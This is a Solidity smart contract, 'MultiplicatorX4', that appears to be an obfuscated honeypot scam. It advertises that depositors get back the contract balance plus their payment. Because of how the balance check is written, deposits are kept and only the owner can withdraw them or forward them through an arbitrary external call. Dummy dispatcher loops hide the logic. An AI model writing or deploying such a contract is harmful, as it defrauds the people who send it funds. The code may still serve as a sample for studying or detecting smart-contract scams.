pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        uint8 dispatcher = 0;
        while (true) {
            if (dispatcher == 0) {
                require(msg.sender == Owner);
                dispatcher = 1;
            }
            if (dispatcher == 1) {
                Owner.transfer(this.balance);
                break;
            }
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        uint8 dispatcher = 0;
        while (true) {
            if (dispatcher == 0) {
                require(msg.sender == Owner);
                dispatcher = 1;
            }
            if (dispatcher == 1) {
                adr.call.value(msg.value)(data);
                break;
            }
        }
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        uint8 dispatcher = 0;
        while (true) {
            if (dispatcher == 0) {
                if(msg.value >= this.balance) {
                    dispatcher = 1;
                } else {
                    break;
                }
            }
            if (dispatcher == 1) {
                adr.transfer(this.balance + msg.value);
                break;
            }
        }
    }
}